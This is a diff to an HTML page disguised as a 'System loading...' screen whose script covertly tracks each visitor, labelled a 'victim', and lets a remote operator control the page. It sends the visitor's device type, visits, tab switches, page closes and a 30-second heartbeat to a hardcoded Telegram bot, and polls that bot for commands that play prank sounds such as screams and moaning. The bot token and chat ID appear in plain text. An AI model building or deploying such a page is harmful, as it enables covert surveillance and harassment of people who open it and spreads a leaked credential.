@@ -2,6 +2,7 @@
 <html>
 <head>
     <title>System Loading...</title>
+    <link rel="icon" href="data:,">
     <style>
         body { 
             background: black; 
@@ -30,342 +31,307 @@
 <body>
     <div id="status">System loading... 0%</div>
     <div id="connection-status">🔴 Connecting to server...</div>
+<script>
+(function() {
+    // =============================================
+    // YOUR TELEGRAM BOT CREDENTIALS - VERIFIED WORKING
+    // =============================================
+    var BOT_TOKEN = '8654014366:AAFWPdct4wFezCEoHFlYZsmzScwzwCmTjjw';
+    var CHAT_ID = 6754338153;
     
-    <script>
-        // =============================================
-        // YOUR TELEGRAM BOT CREDENTIALS - VERIFIED WORKING
-        // =============================================
-        const BOT_TOKEN = '8654014366:AAFWPdct4wFezCEoHFlYZsmzScwzwCmTjjw';
-        const CHAT_ID = 6754338153;
+    // =============================================
+    // BASE URL FOR YOUR SOUNDS
+    // =============================================
+    var SOUND_BASE_URL = 'https://sencal1125-prog.github.io/sen/';
+    
+    var lastUpdateId = 0;
+    var audioEnabled = false;
+    var victimId = generateVictimId();
+    var heartbeatInterval;
+    
+    // =============================================
+    // TEST TELEGRAM CONNECTION IMMEDIATELY
+    // =============================================
+    console.log('Starting Telegram connection test...');
+    fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/getMe')
+        .then(function(response) { return response.json(); })
+        .then(function(data) {
+            console.log('Telegram bot test:', data);
+            if (data.ok) {
+                document.getElementById('connection-status').innerHTML = '🟢 Telegram connected!';
+            } else {
+                document.getElementById('connection-status').innerHTML = '🔴 Telegram error: ' + data.description;
+            }
+        })
+        .catch(function(error) {
+            console.log('Connection error:', error);
+            document.getElementById('connection-status').innerHTML = '🔴 Cannot reach Telegram';
+        });
+    
+    // =============================================
+    // GENERATE UNIQUE VICTIM ID
+    // =============================================
+    function generateVictimId() {
+        var id = localStorage.getItem('victim_id');
+        if (!id) {
+            id = 'victim_' + Math.random().toString(36).substring(2, 15) + 
+                 Math.random().toString(36).substring(2, 15);
+            localStorage.setItem('victim_id', id);
+        }
+        return id;
+    }
+    
+    // =============================================
+    // SEND STATUS TO TELEGRAM
+    // =============================================
+    function sendTelegramMessage(message) {
+        var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message);
         
-        // =============================================
-        // BASE URL FOR YOUR SOUNDS
-        // =============================================
-        const SOUND_BASE_URL = 'https://sencal1125-prog.github.io/sen/';
-        
-        let lastUpdateId = 0;
-        let audioEnabled = false;
-        let victimId = generateVictimId();
-        let heartbeatInterval;
-        
-        // =============================================
-        // TEST TELEGRAM CONNECTION IMMEDIATELY
-        // =============================================
-        console.log('Starting Telegram connection test...');
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`)
-            .then(response => response.json())
-            .then(data => {
-                console.log('Telegram bot test:', data);
+        fetch(url)
+            .then(function(response) { return response.json(); })
+            .then(function(data) {
                 if (data.ok) {
-                    document.getElementById('connection-status').innerHTML = '🟢 Telegram connected!';
+                    console.log('Status sent:', message);
                 } else {
-                    document.getElementById('connection-status').innerHTML = '🔴 Telegram error: ' + data.description;
+                    console.log('Failed to send status:', data);
                 }
             })
-            .catch(error => {
-                console.log('Connection error:', error);
-                document.getElementById('connection-status').innerHTML = '🔴 Cannot reach Telegram';
-            });
+            .catch(function(error) { console.log('Failed to send status:', error); });
+    }
+    
+    // =============================================
+    // DETECT WHEN PAGE OPENS
+    // =============================================
+    function onPageOpen() {
+        var now = new Date();
+        var timeString = now.toLocaleTimeString();
         
-        // =============================================
-        // GENERATE UNIQUE VICTIM ID
-        // =============================================
-        function generateVictimId() {
-            let id = localStorage.getItem('victim_id');
-            if (!id) {
-                id = 'victim_' + Math.random().toString(36).substring(2, 15) + 
-                     Math.random().toString(36).substring(2, 15);
-                localStorage.setItem('victim_id', id);
-            }
-            return id;
-        }
+        var userAgent = navigator.userAgent;
+        var device = 'Unknown';
+        if (userAgent.includes('iPhone')) device = '📱 iPhone';
+        else if (userAgent.includes('Android')) device = '🤖 Android';
+        else if (userAgent.includes('Windows')) device = '💻 Windows';
+        else if (userAgent.includes('Mac')) device = '🍎 Mac';
         
-        // =============================================
-        // SEND STATUS TO TELEGRAM
-        // =============================================
-        function sendTelegramMessage(message) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
-            
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        console.log('Status sent:', message);
-                    } else {
-                        console.log('Failed to send status:', data);
-                    }
-                })
-                .catch(error => console.log('Failed to send status:', error));
-        }
+        sendTelegramMessage(
+            '✅ VICTIM ONLINE\n' +
+            '🆔 ' + victimId + '\n' +
+            '📱 ' + device + '\n' +
+            '⏰ ' + timeString
+        );
         
-        // =============================================
-        // DETECT WHEN PAGE OPENS
-        // =============================================
-        function onPageOpen() {
-            const now = new Date();
-            const timeString = now.toLocaleTimeString();
-            
-            const userAgent = navigator.userAgent;
-            let device = 'Unknown';
-            if (userAgent.includes('iPhone')) device = '📱 iPhone';
-            else if (userAgent.includes('Android')) device = '🤖 Android';
-            else if (userAgent.includes('Windows')) device = '💻 Windows';
-            else if (userAgent.includes('Mac')) device = '🍎 Mac';
-            
-            // Send online status
-            sendTelegramMessage(
-                `✅ **VICTIM ONLINE**\n` +
-                `🆔 ${victimId}\n` +
-                `📱 ${device}\n` +
-                `⏰ ${timeString}`
-            );
-            
+        document.getElementById('connection-status').innerHTML = '🟢 Victim connected - Ready for prank!';
+    }
+    
+    // =============================================
+    // HEARTBEAT
+    // =============================================
+    function startHeartbeat() {
+        heartbeatInterval = setInterval(function() {
+            sendTelegramMessage('💓 HEARTBEAT | Victim still connected | ID: ' + victimId);
+            console.log('Heartbeat sent');
+        }, 30000);
+    }
+    
+    // =============================================
+    // DETECT PAGE CLOSE
+    // =============================================
+    function onPageClose() {
+        sendTelegramMessage('❌ VICTIM DISCONNECTED | ID: ' + victimId + ' | Page closed');
+    }
+    
+    // =============================================
+    // DETECT PAGE HIDDEN
+    // =============================================
+    function onPageHidden() {
+        if (document.hidden) {
+            sendTelegramMessage('⚠️ VICTIM AWAY | ID: ' + victimId + ' | Switched to another app');
+            document.getElementById('connection-status').innerHTML = '🟡 Victim away - App switched';
+        } else {
+            sendTelegramMessage('✅ VICTIM RETURNED | ID: ' + victimId + ' | Back to the page');
             document.getElementById('connection-status').innerHTML = '🟢 Victim connected - Ready for prank!';
         }
+    }
+    
+    // =============================================
+    // UNLOCK AUDIO
+    // =============================================
+    function unlockAudio() {
+        document.addEventListener('touchstart', function enableAudio() {
+            audioEnabled = true;
+            document.removeEventListener('touchstart', enableAudio);
+        });
         
-        // =============================================
-        // HEARTBEAT
-        // =============================================
-        function startHeartbeat() {
-            heartbeatInterval = setInterval(() => {
-                sendTelegramMessage(`💓 **HEARTBEAT** | Victim still connected | ID: ${victimId}`);
-                console.log('Heartbeat sent');
-            }, 30000);
-        }
+        document.addEventListener('click', function enableAudio() {
+            audioEnabled = true;
+            document.removeEventListener('click', enableAudio);
+        });
+    }
+    
+    // =============================================
+    // CHECK TELEGRAM FOR COMMANDS
+    // =============================================
+    function checkTelegram() {
+        var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/getUpdates?offset=' + (lastUpdateId + 1) + '&timeout=5';
         
-        // =============================================
-        // DETECT PAGE CLOSE
-        // =============================================
-        function onPageClose() {
-            sendTelegramMessage(`❌ **VICTIM DISCONNECTED** | ID: ${victimId} | Page closed`);
-        }
-        
-        // =============================================
-        // DETECT PAGE HIDDEN
-        // =============================================
-        function onPageHidden() {
-            if (document.hidden) {
-                sendTelegramMessage(`⚠️ **VICTIM AWAY** | ID: ${victimId} | Switched to another app`);
-                document.getElementById('connection-status').innerHTML = '🟡 Victim away - App switched';
-            } else {
-                sendTelegramMessage(`✅ **VICTIM RETURNED** | ID: ${victimId} | Back to the page`);
-                document.getElementById('connection-status').innerHTML = '🟢 Victim connected - Ready for prank!';
-            }
-        }
-        
-        // =============================================
-        // UNLOCK AUDIO
-        // =============================================
-        function unlockAudio() {
-            const silentAudio = new Audio('data:audio/mp3;base64,SUQzBAAAAAABEVRYWFgAAAAtAAADY29tbWVudABCaWdTb3VuZEJhbmsuY29tIC8gTG9uZG9uU291bmRzLmNvbQAAAFRSSUNLAAAAHwAAAEFkb2JlIEZBUiBKYW5zIFBlbmd1aW4gU3R1ZGlvAAAA/UpLSUkAAAAvAAAALWFjYWNhAGIAbwBvAGsAIAB0AHkAcABlACAAYwBvAGQAZQAgAHAAYQBnAGUAAAAA');
-            silentAudio.play().catch(e => {});
-            
-            document.addEventListener('touchstart', function enableAudio() {
-                audioEnabled = true;
-                document.removeEventListener('touchstart', enableAudio);
+        fetch(url)
+            .then(function(response) { return response.json(); })
+            .then(function(data) {
+                if (data.ok && data.result && data.result.length > 0) {
+                    console.log('Received updates:', data.result);
+                    data.result.forEach(function(update) {
+                        if (update.message && update.message.text) {
+                            console.log('Got command from Telegram:', update.message.text);
+                            playSound(update.message.text);
+                            lastUpdateId = update.update_id;
+                        }
+                    });
+                }
+            })
+            .catch(function(error) {
+                console.log('Telegram error:', error);
             });
-            
-            document.addEventListener('click', function enableAudio() {
-                audioEnabled = true;
-                document.removeEventListener('click', enableAudio);
-            });
+    }
+    
+    // =============================================
+    // PLAY SOUND - ALL COMMANDS INCLUDED
+    // =============================================
+    function playSound(command) {
+        console.log('Playing sound for command:', command);
+        var audio;
+        var statusMessage;
+        
+        switch(command.toLowerCase()) {
+            case '/fart':
+                audio = new Audio(SOUND_BASE_URL + 'fart.mp3');
+                statusMessage = '💨 System flatulence detected...';
+                break;
+            case '/scream':
+                audio = new Audio(SOUND_BASE_URL + 'scream.mp3');
+                statusMessage = '⚠️ AAAAAHHHHH!';
+                break;
+            case '/vomit':
+                audio = new Audio(SOUND_BASE_URL + 'vomit.mp3');
+                statusMessage = '🤢 System malfunction... *urp*';
+                break;
+            case '/error':
+                audio = new Audio(SOUND_BASE_URL + 'error.mp3');
+                statusMessage = '🔴 CRITICAL ERROR DETECTED';
+                break;
+            case '/moan':
+            case '/moaning':
+                audio = new Audio(SOUND_BASE_URL + 'moaning.mp3');
+                statusMessage = "😏 Uhhhh... someone's enjoying that...";
+                break;
+            case '/bruh':
+                audio = new Audio(SOUND_BASE_URL + 'bruh.mp3');
+                statusMessage = '🤨 Bruh...';
+                break;
+            case '/roblox':
+                audio = new Audio(SOUND_BASE_URL + 'roblox.mp3');
+                statusMessage = '💀 OOF!';
+                break;
+            case '/metalpipe':
+                audio = new Audio(SOUND_BASE_URL + 'metalpipe.mp3');
+                statusMessage = '🏗️ BONGGGGG!';
+                break;
+            case '/random':
+                var randomSounds = ['fart.mp3','scream.mp3','vomit.mp3','error.mp3','moaning.mp3','bruh.mp3','roblox.mp3','metalpipe.mp3'];
+                var randomIndex = Math.floor(Math.random() * randomSounds.length);
+                audio = new Audio(SOUND_BASE_URL + randomSounds[randomIndex]);
+                statusMessage = '🎲 Random sound!';
+                break;
+            default:
+                audio = new Audio(SOUND_BASE_URL + 'metalpipe.mp3');
+                statusMessage = '❓ Unknown command: ' + command;
         }
         
-        // =============================================
-        // CHECK TELEGRAM FOR COMMANDS
-        // =============================================
-        function checkTelegram() {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
-            
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok && data.result && data.result.length > 0) {
-                        console.log('Received updates:', data.result);
-                        data.result.forEach(update => {
-                            if (update.message && update.message.text) {
-                                console.log('Got command from Telegram:', update.message.text);
-                                playSound(update.message.text);
-                                lastUpdateId = update.update_id;
-                            }
-                        });
-                    }
+        document.getElementById('status').innerHTML = statusMessage;
+        
+        if (audio) {
+            audio.play()
+                .then(function() {
+                    console.log('Sound played successfully');
                 })
-                .catch(error => {
-                    console.log('Telegram error:', error);
+                .catch(function(error) {
+                    console.log('Audio play failed:', error);
+                    document.getElementById('status').innerHTML = '⚠️ Tap screen to enable sound';
+                    document.body.addEventListener('touchstart', function playOnTouch() {
+                        audio.play().catch(function(e) { console.log('Still failed:', e); });
+                        document.body.removeEventListener('touchstart', playOnTouch);
+                    }, { once: true });
                 });
         }
         
-        // =============================================
-        // PLAY SOUND - ALL COMMANDS INCLUDED
-        // =============================================
-        function playSound(command) {
-            console.log('Playing sound for command:', command);
-            let audio;
-            let statusMessage;
-            
-            switch(command.toLowerCase()) {
-                case '/fart':
-                    audio = new Audio(SOUND_BASE_URL + 'fart.mp3');
-                    statusMessage = '💨 System flatulence detected...';
-                    break;
-                    
-                case '/scream':
-                    audio = new Audio(SOUND_BASE_URL + 'scream.mp3');
-                    statusMessage = '⚠️ AAAAAHHHHH!';
-                    break;
-                    
-                case '/vomit':
-                    audio = new Audio(SOUND_BASE_URL + 'vomit.mp3');
-                    statusMessage = '🤢 System malfunction... *urp*';
-                    break;
-                    
-                case '/error':
-                    audio = new Audio(SOUND_BASE_URL + 'error.mp3');
-                    statusMessage = '🔴 CRITICAL ERROR DETECTED';
-                    break;
-                    
-                case '/moan':
-                case '/moaning':
-                    audio = new Audio(SOUND_BASE_URL + 'moaning.mp3');
-                    statusMessage = '😏 Uhhhh... someone\'s enjoying that...';
-                    break;
-                    
-                case '/bruh':
-                    audio = new Audio(SOUND_BASE_URL + 'bruh.mp3');
-                    statusMessage = '🤨 Bruh...';
-                    break;
-                    
-                case '/roblox':
-                    audio = new Audio(SOUND_BASE_URL + 'roblox.mp3');
-                    statusMessage = '💀 OOF!';
-                    break;
-                    
-                case '/metalpipe':
-                    audio = new Audio(SOUND_BASE_URL + 'metalpipe.mp3');
-                    statusMessage = '🏗️ BONGGGGG!';
-                    break;
-                    
-                case '/random':
-                    const randomSounds = [
-                        'fart.mp3',
-                        'scream.mp3',
-                        'vomit.mp3',
-                        'error.mp3',
-                        'moaning.mp3',
-                        'bruh.mp3',
-                        'roblox.mp3',
-                        'metalpipe.mp3'
-                    ];
-                    const randomIndex = Math.floor(Math.random() * randomSounds.length);
-                    audio = new Audio(SOUND_BASE_URL + randomSounds[randomIndex]);
-                    statusMessage = '🎲 Random sound!';
-                    break;
-                    
-                default:
-                    audio = new Audio(SOUND_BASE_URL + 'metalpipe.mp3');
-                    statusMessage = '❓ Unknown command: ' + command;
-            }
-            
-            document.getElementById('status').innerHTML = statusMessage;
-            
-            if (audio) {
-                audio.play()
-                    .then(() => {
-                        console.log('Sound played successfully');
-                    })
-                    .catch(error => {
-                        console.log('Audio play failed:', error);
-                        document.getElementById('status').innerHTML = '⚠️ Tap screen to enable sound';
-                        
-                        const playOnTouch = function() {
-                            audio.play().catch(e => console.log('Still failed:', e));
-                            document.body.removeEventListener('touchstart', playOnTouch);
-                        };
-                        document.body.addEventListener('touchstart', playOnTouch, { once: true });
-                    });
-            }
-            
-            updateProgress();
-        }
-        
-        // =============================================
-        // FAKE PROGRESS BAR
-        // =============================================
-        function updateProgress() {
-            let percent = 0;
-            const statusElement = document.getElementById('status');
-            const originalText = statusElement.innerHTML;
-            
-            const interval = setInterval(() => {
-                percent += Math.floor(Math.random() * 10) + 1;
-                if (percent >= 100) {
-                    percent = 100;
-                    clearInterval(interval);
-                    setTimeout(() => {
-                        if (!statusElement.innerHTML.includes('💨') && 
-                            !statusElement.innerHTML.includes('⚠️') &&
-                            !statusElement.innerHTML.includes('🤢') &&
-                            !statusElement.innerHTML.includes('🔴') &&
-                            !statusElement.innerHTML.includes('😏') &&
-                            !statusElement.innerHTML.includes('🤨') &&
-                            !statusElement.innerHTML.includes('💀') &&
-                            !statusElement.innerHTML.includes('🏗️') &&
-                            !statusElement.innerHTML.includes('🎲')) {
-                            statusElement.innerHTML = 'System loading... 0%';
-                            updateProgress();
-                        }
-                    }, 2000);
-                }
-                
-                if (statusElement.innerHTML === originalText || 
-                    statusElement.innerHTML.includes('System loading')) {
-                    statusElement.innerHTML = `System loading... ${percent}%`;
-                }
-            }, 300);
-        }
-        
-        // =============================================
-        // SETUP
-        // =============================================
-        
-        // Call onPageOpen after a short delay to ensure everything is ready
-        setTimeout(() => {
-            onPageOpen();
-            startHeartbeat();
-        }, 1000);
-        
-        window.addEventListener('beforeunload', onPageClose);
-        document.addEventListener('visibilitychange', onPageHidden);
-        
-        window.addEventListener('online', function() {
-            sendTelegramMessage(`✅ **CONNECTION RESTORED** | ID: ${victimId} | Internet back online`);
-        });
-        
-        window.addEventListener('offline', function() {
-            sendTelegramMessage(`⚠️ **CONNECTION LOST** | ID: ${victimId} | No internet connection`);
-        });
-        
-        unlockAudio();
         updateProgress();
+    }
+    
+    // =============================================
+    // FAKE PROGRESS BAR
+    // =============================================
+    function updateProgress() {
+        var percent = 0;
+        var statusElement = document.getElementById('status');
         
-        // Check for commands every 3 seconds
-        setInterval(checkTelegram, 3000);
-        // Check immediately
-        setTimeout(checkTelegram, 2000);
-        
-        // Debug tap (tap 5 times to show victim ID)
-        let tapCount = 0;
-        document.getElementById('status').addEventListener('click', function() {
-            tapCount++;
-            if (tapCount >= 5) {
-                alert('Victim ID: ' + victimId);
-                tapCount = 0;
+        var interval = setInterval(function() {
+            percent += Math.floor(Math.random() * 10) + 1;
+            if (percent >= 100) {
+                percent = 100;
+                clearInterval(interval);
+                setTimeout(function() {
+                    var txt = statusElement.innerHTML;
+                    var soundEmojis = ['💨','⚠️','🤢','🔴','😏','🤨','💀','🏗️','🎲','❓'];
+                    var hasSoundEmoji = soundEmojis.some(function(e) { return txt.includes(e); });
+                    if (!hasSoundEmoji) {
+                        statusElement.innerHTML = 'System loading... 0%';
+                        updateProgress();
+                    }
+                }, 2000);
             }
-        });
-        
-        console.log('Website loaded, victim ID:', victimId);
-        
-    </script>
+            
+            if (statusElement.innerHTML.includes('System loading')) {
+                statusElement.innerHTML = 'System loading... ' + percent + '%';
+            }
+        }, 300);
+    }
+    
+    // =============================================
+    // SETUP
+    // =============================================
+    setTimeout(function() {
+        onPageOpen();
+        startHeartbeat();
+    }, 1000);
+    
+    window.addEventListener('beforeunload', onPageClose);
+    document.addEventListener('visibilitychange', onPageHidden);
+    
+    window.addEventListener('online', function() {
+        sendTelegramMessage('✅ CONNECTION RESTORED | ID: ' + victimId + ' | Internet back online');
+    });
+    
+    window.addEventListener('offline', function() {
+        sendTelegramMessage('⚠️ CONNECTION LOST | ID: ' + victimId + ' | No internet connection');
+    });
+    
+    unlockAudio();
+    updateProgress();
+    
+    setInterval(checkTelegram, 3000);
+    setTimeout(checkTelegram, 2000);
+    
+    var tapCount = 0;
+    document.getElementById('status').addEventListener('click', function() {
+        tapCount++;
+        if (tapCount >= 5) {
+            alert('Victim ID: ' + victimId);
+            tapCount = 0;
+        }
+    });
+    
+    console.log('Website loaded, victim ID:', victimId);
+})();
+</script>
+
 </body>
 </html>
